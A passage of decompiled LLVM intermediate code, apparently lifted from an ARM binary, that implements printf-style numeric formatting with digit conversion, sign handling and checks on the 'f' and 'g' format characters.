  %v1_16d8c = add i32 %v0_16d8c, -103
  %v3_16d8c = sub i32 102, %v0_16d8c
  %v4_16d8c = and i32 %v3_16d8c, %v0_16d8c
  %v5_16d8c = icmp slt i32 %v4_16d8c, 0
  store i1 %v5_16d8c, i1* %cpsr_v.global-to-local, align 1
  %v6_16d8c = icmp slt i32 %v1_16d8c, 0
  store i1 %v6_16d8c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d8c = icmp eq i32 %v0_16d8c, 103
  store i1 %v7_16d8c, i1* %cpsr_z.global-to-local, align 1
  %v3_16d90 = add i32 %v2_16d90, 1
  %v4_16d90 = inttoptr i32 %v3_16d90 to i8*
  store i8 0, i8* %v4_16d90, align 1
  %v0_16d94 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d94 = add i32 %v0_16d94, 1
  store i32 %v1_16d94, i32* %r1.global-to-local, align 4
  %v0_16d98 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16d98, label %dec_label_pc_16d9c, label %dec_label_pc_16dcc

dec_label_pc_16d9c:                               ; preds = %bb251
  %v0_16d9c = load i32, i32* %r0.global-to-local, align 4
  %v1_16d9c = load i32, i32* %ip.global-to-local, align 4
  %v2_16d9c = sub i32 %v0_16d9c, %v1_16d9c
  %v4_16d9c = xor i32 %v1_16d9c, %v0_16d9c
  %v5_16d9c = xor i32 %v2_16d9c, %v0_16d9c
  %v6_16d9c = and i32 %v5_16d9c, %v4_16d9c
  %v7_16d9c = icmp slt i32 %v6_16d9c, 0
  %v8_16d9c = icmp slt i32 %v2_16d9c, 0
  %v9_16d9c = icmp eq i32 %v0_16d9c, %v1_16d9c
  %v3_16da0 = xor i1 %v8_16d9c, %v7_16d9c
  %v4_16da0 = or i1 %v9_16d9c, %v3_16da0
  %.273 = zext i1 %v4_16da0 to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_16da8 = add i32 %v0_16d9c, 4
  %v3_16da8 = sub i32 0, %v0_16d9c
  %v4_16da8 = and i32 %v1_16da8, %v3_16da8
  %v5_16da8 = icmp slt i32 %v4_16da8, 0
  store i1 %v5_16da8, i1* %cpsr_v.global-to-local, align 1
  %v6_16da8 = icmp slt i32 %v1_16da8, 0
  store i1 %v6_16da8, i1* %cpsr_n.global-to-local, align 1
  %v7_16da8 = icmp eq i32 %v1_16da8, 0
  store i1 %v7_16da8, i1* %cpsr_z.global-to-local, align 1
  %v2_16dac = xor i1 %v6_16da8, %v5_16da8
  br i1 %v2_16dac, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_16d9c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_16d9c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16db0 = icmp eq i1 %v4_16da0, false
  store i1 %v2_16db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16db0, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_16db83551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16db83551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16dd8

bb255:                                            ; preds = %bb254
  %v3_16db4 = sub i32 %v1_16d9c, %v0_16d9c
  store i32 %v3_16db4, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16de4

dec_label_pc_16dcc:                               ; preds = %bb251
  %v0_16dcc = load i32, i32* %sl.global-to-local, align 4
  %v1_16dcc = add i32 %v0_16dcc, -102
  %v3_16dcc = sub i32 101, %v0_16dcc
  %v4_16dcc = and i32 %v3_16dcc, %v0_16dcc
  %v5_16dcc = icmp slt i32 %v4_16dcc, 0
  store i1 %v5_16dcc, i1* %cpsr_v.global-to-local, align 1
  %v6_16dcc = icmp slt i32 %v1_16dcc, 0
  store i1 %v6_16dcc, i1* %cpsr_n.global-to-local, align 1
  %v7_16dcc = icmp eq i32 %v0_16dcc, 102
  store i1 %v7_16dcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16dcc, i32* %r7.global-to-local, align 4
  br i1 %v7_16dcc, label %dec_label_pc_16dcc.dec_label_pc_16de4_crit_edge, label %dec_label_pc_16dd8

dec_label_pc_16dcc.dec_label_pc_16de4_crit_edge:  ; preds = %dec_label_pc_16dcc
  %v0_16de4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16de4

dec_label_pc_16dd8:                               ; preds = %.thread165, %dec_label_pc_16dcc
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16df4

dec_label_pc_16de4:                               ; preds = %bb255, %dec_label_pc_16dcc.dec_label_pc_16de4_crit_edge
  %v0_16de4 = phi i32 [ %v0_16d9c, %bb255 ], [ %v0_16de4.pre, %dec_label_pc_16dcc.dec_label_pc_16de4_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_16db4, %bb255 ], [ %v0_16cbc, %dec_label_pc_16dcc.dec_label_pc_16de4_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16de4 = icmp slt i32 %v0_16de4, 0
  store i1 %v1_16de4, i1* %cpsr_n.global-to-local, align 1
  %v2_16de4 = icmp eq i32 %v0_16de4, 0
  store i1 %v2_16de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16de4, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_16de4
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_16dec = load i32, i32* %r2.global-to-local, align 4
  %v6_16dec = add i32 %v5_16dec, -1
  %v7_16dec = inttoptr i32 %v6_16dec to i8*
  store i8 48, i8* %v7_16dec, align 1
  %v8_16dec = load i32, i32* %r2.global-to-local, align 4
  %v9_16dec = add i32 %v8_16dec, -1
  store i32 %v9_16dec, i32* %r2.global-to-local, align 4
  %v0_16df0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16e20.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_16e24.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16e24.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_16de4, %bb256
  %v1_16e24.pre = phi i1 [ %v1_16e24.pre.pre, %bb256 ], [ false, %dec_label_pc_16de4 ]
  %v0_16e24.pre = phi i1 [ %v0_16e24.pre.pre, %bb256 ], [ false, %dec_label_pc_16de4 ]
  %v1_16e20.pre = phi i32 [ %v1_16e20.pre.pre, %bb256 ], [ %v1_16d94, %dec_label_pc_16de4 ]
  %v0_16df0 = phi i32 [ %v0_16df0.pre, %bb256 ], [ %v0_16de4, %dec_label_pc_16de4 ]
  store i32 %v0_16df0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16df4

dec_label_pc_16df4:                               ; preds = %dec_label_pc_16dd8, %bb257
  %v0_16e8c = phi i32 [ 0, %dec_label_pc_16dd8 ], [ %v0_16df0, %bb257 ]
  %v1_16e28 = phi i1 [ false, %dec_label_pc_16dd8 ], [ %v1_16e24.pre, %bb257 ]
  %v0_16e28 = phi i1 [ false, %dec_label_pc_16dd8 ], [ %v0_16e24.pre, %bb257 ]
  %v1_16e20 = phi i32 [ %v1_16d94, %dec_label_pc_16dd8 ], [ %v1_16e20.pre, %bb257 ]
  %v1_16f48 = phi i32 [ %v0_16cbc, %dec_label_pc_16dd8 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_16e00 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_16e00, i32* %r3.global-to-local, align 4
  %v0_16e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_16e0c = inttoptr i32 %v0_16e0c to i8*
  %v2_16e0c = load i8, i8* %v1_16e0c, align 1
  %v3_16e0c = zext i8 %v2_16e0c to i32
  store i32 %v3_16e0c, i32* %r3.global-to-local, align 4
  %v5_16e0c = add i32 %v0_16e0c, 1
  store i32 %v5_16e0c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_16e0c, i32* %stack_var_-38, align 4
  %v2_16e20 = sub i32 %v1_16e20, %v5_16e0c
  store i32 %v2_16e20, i32* %r1.global-to-local, align 4
  %v2_16e24 = xor i1 %v1_16e28, %v0_16e28
  br i1 %v2_16e24, label %.thread167, label %dec_label_pc_16e2c

.thread167:                                       ; preds = %dec_label_pc_16df4
  %v5_16e24 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_16e24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16e9c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16df4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16e30 = sub i32 %v0_16e8c, %v2_16e20
  %v4_16e30 = xor i32 %v2_16e20, %v0_16e8c
  %v5_16e30 = xor i32 %v2_16e30, %v0_16e8c
  %v6_16e30 = and i32 %v5_16e30, %v4_16e30
  %v7_16e30 = icmp slt i32 %v6_16e30, 0
  store i1 %v7_16e30, i1* %cpsr_v.global-to-local, align 1
  %v8_16e30 = icmp slt i32 %v2_16e30, 0
  store i1 %v8_16e30, i1* %cpsr_n.global-to-local, align 1
  %v9_16e30 = icmp eq i32 %v0_16e8c, %v2_16e20
  store i1 %v9_16e30, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_16e3c = xor i1 %v8_16e30, %v7_16e30
  br i1 %v2_16e3c, label %dec_label_pc_16e78, label %dec_label_pc_16e40

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e2c
  store i32 %v2_16e30, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_16e30, i1* %cpsr_n.global-to-local, align 1
  %v2_16e44 = icmp eq i32 %v2_16e30, 0
  store i1 %v2_16e44, i1* %cpsr_z.global-to-local, align 1
  %v2_16e4c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_16e4c, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_16e30, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_16e58

.thread169:                                       ; preds = %dec_label_pc_16e40
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e40
  store i32 ptrtoint (i32* @global_var_20eb7.1260 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_16e64 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_16e64, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_16e9c

dec_label_pc_16e78:                               ; preds = %dec_label_pc_16e2c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16e78 = icmp slt i32 %v0_16e8c, 0
  store i1 %v1_16e78, i1* %cpsr_n.global-to-local, align 1
  %v2_16e78 = icmp eq i32 %v0_16e8c, 0
  store i1 %v2_16e78, i1* %cpsr_z.global-to-local, align 1
  %v2_16e7c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_16e7c, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_16e8c, 1
  br i1 %tmp259, label %dec_label_pc_16e98, label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16e78
  %v2_16e8c = sub i32 %v2_16e20, %v0_16e8c
  store i32 %v2_16e8c, i32* %r1.global-to-local, align 4
  %v2_16e90 = add i32 %v5_16e0c, %v0_16e8c
  store i32 %v2_16e90, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e88, %.thread169, %dec_label_pc_16e78
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_16e78 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_16e88 ]
  %v0_16eb0102 = phi i32 [ %v2_16e20, %dec_label_pc_16e78 ], [ 0, %.thread169 ], [ %v2_16e8c, %dec_label_pc_16e88 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16e9c

dec_label_pc_16e9c:                               ; preds = %.thread167, %dec_label_pc_16e58, %dec_label_pc_16e98
  %v1_16ed4 = phi i32 [ %v2_16e64, %dec_label_pc_16e58 ], [ %storemerge181, %dec_label_pc_16e98 ], [ %v5_16e24, %.thread167 ]
  %v0_16eec110 = phi i32 [ -1, %dec_label_pc_16e58 ], [ -1, %dec_label_pc_16e98 ], [ %v0_16e8c, %.thread167 ]
  %v0_16eb0 = phi i32 [ 0, %dec_label_pc_16e58 ], [ %v0_16eb0102, %dec_label_pc_16e98 ], [ %v2_16e20, %.thread167 ]
  %v2_16e9c = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_16e9c, i32* %r2.global-to-local, align 4
  %v1_16ea0 = add i32 %v2_16e9c, 12
  %v2_16ea0 = inttoptr i32 %v1_16ea0 to i32*
  %v3_16ea0 = load i32, i32* %v2_16ea0, align 4
  %v1_16ea4 = and i32 %v3_16ea0, 16
  store i32 %v1_16ea4, i32* %lr.global-to-local, align 4
  %v2_16ea4 = icmp eq i32 %v1_16ea4, 0
  %tmp282 = zext i1 %v2_16ea4 to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16eb0 = icmp slt i32 %v0_16eb0, 0
  store i1 %v1_16eb0, i1* %cpsr_n.global-to-local, align 1
  %v2_16eb0 = icmp eq i32 %v0_16eb0, 0
  store i1 %v2_16eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16eb0, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_16e9c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ed0

bb262:                                            ; preds = %dec_label_pc_16e9c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_16ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ea4, label %dec_label_pc_16ec0, label %dec_label_pc_16ed0

dec_label_pc_16ec0:                               ; preds = %bb262
  store i32 %v1_16f48, i32* %r3.global-to-local, align 4
  %v0_16ec4 = load i32, i32* %sl.global-to-local, align 4
  %v1_16ec4 = add i32 %v0_16ec4, -103
  %v3_16ec4 = sub i32 102, %v0_16ec4
  %v4_16ec4 = and i32 %v3_16ec4, %v0_16ec4
  %v5_16ec4 = icmp slt i32 %v4_16ec4, 0
  store i1 %v5_16ec4, i1* %cpsr_v.global-to-local, align 1
  %v6_16ec4 = icmp slt i32 %v1_16ec4, 0
  store i1 %v6_16ec4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ec4 = icmp eq i32 %v0_16ec4, 103
  store i1 %v7_16ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16ec4, label %dec_label_pc_16eec, label %bb263

bb263:                                            ; preds = %dec_label_pc_16ec0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_16ec8 = icmp slt i32 %v1_16f48, 0
  store i1 %v2_16ec8, i1* %cpsr_n.global-to-local, align 1
  %v3_16ec8 = icmp eq i32 %v1_16f48, 0
  store i1 %v3_16ec8, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_16f48, 1
  br i1 %tmp264, label %dec_label_pc_16eec, label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %.thread40, %bb262, %bb263
  %v2_16ed4 = inttoptr i32 %v1_16ed4 to i32*
  store i32 112, i32* %v2_16ed4, align 4
  %v1_16edc = load i32, i32* %r6.global-to-local, align 4
  %v2_16edc = add i32 %v1_16edc, 4
  %v3_16edc = inttoptr i32 %v2_16edc to i32*
  store i32 1, i32* %v3_16edc, align 4
  store i32 ptrtoint (i32* @global_var_20ec4.1262 to i32), i32* %r3.global-to-local, align 4
  %v1_16ee4 = load i32, i32* %r6.global-to-local, align 4
  %v2_16ee4 = add i32 %v1_16ee4, 8
  %v3_16ee4 = inttoptr i32 %v2_16ee4 to i32*
  store i32 ptrtoint (i32* @global_var_20ec4.1262 to i32), i32* %v3_16ee4, align 4
  %v0_16ee8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16ee8 = add i32 %v0_16ee8, 12
  store i32 %v1_16ee8, i32* %r6.global-to-local, align 4
  %v0_16eec.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16eec

dec_label_pc_16eec:                               ; preds = %dec_label_pc_16ec0, %bb263, %dec_label_pc_16ed0
  %v1_16ef8 = phi i32 [ %v1_16ed4, %bb263 ], [ %v1_16ee8, %dec_label_pc_16ed0 ], [ %v1_16ed4, %dec_label_pc_16ec0 ]
  %v0_16eec = phi i32 [ %v0_16eec110, %bb263 ], [ %v0_16eec.pre, %dec_label_pc_16ed0 ], [ %v0_16eec110, %dec_label_pc_16ec0 ]
  %v1_16eec = add i32 %v0_16eec, 1
  store i32 %v1_16eec, i32* %ip.global-to-local, align 4
  %v3_16eec = sub i32 0, %v0_16eec
  %v4_16eec = and i32 %v1_16eec, %v3_16eec
  %v5_16eec = icmp slt i32 %v4_16eec, 0
  store i1 %v5_16eec, i1* %cpsr_v.global-to-local, align 1
  %v6_16eec = icmp slt i32 %v1_16eec, 0
  store i1 %v6_16eec, i1* %cpsr_n.global-to-local, align 1
  %v7_16eec = icmp eq i32 %v1_16eec, 0
  store i1 %v7_16eec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16eec, label %dec_label_pc_16f10, label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16eec
  %v1_16ef4 = sub i32 -1, %v0_16eec
  %v2_16ef8 = add i32 %v1_16ef8, 4
  %v3_16ef8 = inttoptr i32 %v2_16ef8 to i32*
  store i32 %v1_16ef4, i32* %v3_16ef8, align 4
  store i32 ptrtoint (i32* @global_var_20eb7.1260 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_16f04 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f04 = inttoptr i32 %v1_16f04 to i32*
  store i32 176, i32* %v2_16f04, align 4
  %v0_16f08 = load i32, i32* %r3.global-to-local, align 4
  %v1_16f08 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f08 = add i32 %v1_16f08, 8
  %v3_16f08 = inttoptr i32 %v2_16f08 to i32*
  store i32 %v0_16f08, i32* %v3_16f08, align 4
  %v0_16f0c = load i32, i32* %r6.global-to-local, align 4
  %v1_16f0c = add i32 %v0_16f0c, 12
  store i32 %v1_16f0c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16f10

dec_label_pc_16f10:                               ; preds = %dec_label_pc_16eec, %dec_label_pc_16ef4
  %v2_16f18 = phi i32 [ %v1_16ef8, %dec_label_pc_16eec ], [ %v1_16f0c, %dec_label_pc_16ef4 ]
  %v0_16f10 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16f10 = icmp slt i32 %v0_16f10, 0
  store i1 %v1_16f10, i1* %cpsr_n.global-to-local, align 1
  %v2_16f10 = icmp eq i32 %v0_16f10, 0
  store i1 %v2_16f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f10, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_16f10
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_16f18 = inttoptr i32 %v2_16f18 to i32*
  store i32 112, i32* %v3_16f18, align 4
  %v1_16f1c = load i32, i32* %r4.global-to-local, align 4
  %v2_16f1c = load i32, i32* %r6.global-to-local, align 4
  %v3_16f1c = add i32 %v2_16f1c, 8
  %v4_16f1c = inttoptr i32 %v3_16f1c to i32*
  store i32 %v1_16f1c, i32* %v4_16f1c, align 4
  %v1_16f20 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f20 = load i32, i32* %r6.global-to-local, align 4
  %v3_16f20 = add i32 %v2_16f20, 4
  %v4_16f20 = inttoptr i32 %v3_16f20 to i32*
  store i32 %v1_16f20, i32* %v4_16f20, align 4
  %v1_16f24 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f24 = add i32 %v1_16f24, 12
  store i32 %v2_16f24, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_16f10, %bb265
  %v1_16f4c = phi i32 [ %v2_16f18, %dec_label_pc_16f10 ], [ %v2_16f24, %bb265 ]
  %v0_16f28 = load i32, i32* %sl.global-to-local, align 4
  %v1_16f28 = add i32 %v0_16f28, -103
  %v3_16f28 = sub i32 102, %v0_16f28
  %v4_16f28 = and i32 %v3_16f28, %v0_16f28
  %v5_16f28 = icmp slt i32 %v4_16f28, 0
  store i1 %v5_16f28, i1* %cpsr_v.global-to-local, align 1
  %v6_16f28 = icmp slt i32 %v1_16f28, 0
  store i1 %v6_16f28, i1* %cpsr_n.global-to-local, align 1
  %v7_16f28 = icmp eq i32 %v0_16f28, 103
  store i1 %v7_16f28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f28, label %dec_label_pc_16f30, label %dec_label_pc_16f38

dec_label_pc_16f30:                               ; preds = %.thread49
  %v0_16f30 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16f30 = icmp slt i32 %v0_16f30, 0
  store i1 %v1_16f30, i1* %cpsr_n.global-to-local, align 1
  %v2_16f30 = icmp eq i32 %v0_16f30, 0
  store i1 %v2_16f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f30, label %dec_label_pc_16f64, label %dec_label_pc_16f38

dec_label_pc_16f38:                               ; preds = %.thread49, %dec_label_pc_16f30
  %v0_16f38 = load i32, i32* %ip.global-to-local, align 4
  %v1_16f38 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f38 = sub i32 %v1_16f38, %v0_16f38
  store i32 %v2_16f38, i32* %r3.global-to-local, align 4
  store i32 %v1_16f48, i32* %ip.global-to-local, align 4
  %v2_16f40 = sub i32 %v2_16f38, %v1_16f48
  %v4_16f40 = xor i32 %v2_16f38, %v1_16f48
  %v5_16f40 = xor i32 %v2_16f40, %v2_16f38
  %v6_16f40 = and i32 %v5_16f40, %v4_16f40
  %v7_16f40 = icmp slt i32 %v6_16f40, 0
  store i1 %v7_16f40, i1* %cpsr_v.global-to-local, align 1
  %v8_16f40 = icmp slt i32 %v2_16f40, 0
  store i1 %v8_16f40, i1* %cpsr_n.global-to-local, align 1
  %v9_16f40 = icmp eq i32 %v2_16f38, %v1_16f48
  store i1 %v9_16f40, i1* %cpsr_z.global-to-local, align 1
  %v2_16f44 = xor i1 %v8_16f40, %v7_16f40
  br i1 %v2_16f44, label %dec_label_pc_16f48, label %dec_label_pc_16f64

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f38
  %v2_16f48 = sub i32 %v1_16f48, %v2_16f38
  %v2_16f4c = add i32 %v1_16f4c, 4
  %v3_16f4c = inttoptr i32 %v2_16f4c to i32*
  store i32 %v2_16f48, i32* %v3_16f4c, align 4
  store i32 ptrtoint (i32* @global_var_20eb7.1260 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_16f58 = load i32, i32* %r6.global-to-local, align 4
  %v2_16f58 = inttoptr i32 %v1_16f58 to i32*
  store i32 176, i32* %v2_16f58, align 4
  %v0_16f5c = load i32, i32* %r3.global-to-local, align 4
  %v1_16f5c = load i32, i32* %r6.global-to-local, align 4
  %v2_16f5c = add i32 %v1_16f5c, 8
  %v3_16f5c = inttoptr i32 %v2_16f5c to i32*
  store i32 %v0_16f5c, i32* %v3_16f5c, align 4
  %v0_16f60 = load i32, i32* %r6.global-to-local, align 4
  %v1_16f60 = add i32 %v0_16f60, 12
  store i32 %v1_16f60, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16f64

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f38, %dec_label_pc_16f30, %dec_label_pc_16f48
  %v1_16ff8.pre.pre = phi i32 [ %v1_16f4c, %dec_label_pc_16f38 ], [ %v1_16f4c, %dec_label_pc_16f30 ], [ %v1_16f60, %dec_label_pc_16f48 ]
  %v0_16f64 = load i32, i32* %r7.global-to-local, align 4
  %v1_16f64 = add i32 %v0_16f64, -102
  %v3_16f64 = sub i32 101, %v0_16f64
  %v4_16f64 = and i32 %v3_16f64, %v0_16f64
  %v5_16f64 = icmp slt i32 %v4_16f64, 0
  store i1 %v5_16f64, i1* %cpsr_v.global-to-local, align 1
  %v6_16f64 = icmp slt i32 %v1_16f64, 0
  store i1 %v6_16f64, i1* %cpsr_n.global-to-local, align 1
  %v7_16f64 = icmp eq i32 %v0_16f64, 102
  store i1 %v7_16f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f64, label %dec_label_pc_16fec, label %dec_label_pc_16f6c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f64
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16f70 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16f70 = icmp slt i32 %v0_16f70, 0
  store i1 %v1_16f70, i1* %cpsr_n.global-to-local, align 1
  %v2_16f70 = icmp eq i32 %v0_16f70, 0
  store i1 %v2_16f70, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_16f84 = sub i32 0, %v0_16f70
  %storemerge180 = select i1 %v1_16f70, i32 %v4_16f84, i32 %v0_16f70
  %tmp283 = ashr i32 %v0_16f70, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_16f8c = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_16f8c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16f94

dec_label_pc_16f94:                               ; preds = %dec_label_pc_16fc4, %dec_label_pc_16f94, %dec_label_pc_16f6c
  %v2_16fac = phi i32 [ %v2_16f8c, %dec_label_pc_16f6c ], [ %v6_16fac, %dec_label_pc_16f94 ], [ %v6_16fac, %dec_label_pc_16fc4 ]
  %v0_16fa8 = phi i32 [ %storemerge180, %dec_label_pc_16f6c ], [ %v2_16fb0, %dec_label_pc_16f94 ], [ %v2_16fb0, %dec_label_pc_16fc4 ]
  %v2_16f9c = srem i32 %v0_16fa8, 10
  %v1_16fa0 = add nsw i32 %v2_16f9c, 48
  store i32 %v1_16fa0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_16fa8, i32* %r0.global-to-local, align 4
  %v1_16fac = trunc i32 %v1_16fa0 to i8
  %v3_16fac = add i32 %v2_16fac, -1
  %v4_16fac = inttoptr i32 %v3_16fac to i8*
  store i8 %v1_16fac, i8* %v4_16fac, align 1
  %v5_16fac = load i32, i32* %r5.global-to-local, align 4
  %v6_16fac = add i32 %v5_16fac, -1
  store i32 %v6_16fac, i32* %r5.global-to-local, align 4
  %v0_16fb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_16fb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16fb0 = sdiv i32 %v0_16fb0, %v1_16fb0
  store i32 %v2_16fb0, i32* %r0.global-to-local, align 4
  %v0_16fb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_16fb4 = add i32 %v0_16fb4, 1
  store i32 %v1_16fb4, i32* %r7.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb4, -2
  %v3_16fb8 = sub i32 1, %v0_16fb4
  %v4_16fb8 = and i32 %v3_16fb8, %v1_16fb4
  %v5_16fb8 = icmp slt i32 %v4_16fb8, 0
  store i1 %v5_16fb8, i1* %cpsr_v.global-to-local, align 1
  %v6_16fb8 = icmp slt i32 %v1_16fb8, 0
  store i1 %v6_16fb8, i1* %cpsr_n.global-to-local, align 1
  %v7_16fb8 = icmp eq i32 %v1_16fb4, 3
  store i1 %v7_16fb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16fb0, i32* %r4.global-to-local, align 4
  %v7_16fc0 = icmp slt i32 %v1_16fb4, 4
  br i1 %v7_16fc0, label %dec_label_pc_16f94, label %dec_label_pc_16fc4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16f94
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16fc4 = icmp slt i32 %v2_16fb0, 0
  store i1 %v1_16fc4, i1* %cpsr_n.global-to-local, align 1
  %v2_16fc4 = icmp eq i32 %v2_16fb0, 0
  store i1 %v2_16fc4, i1* %cpsr_z.global-to-local, align 1
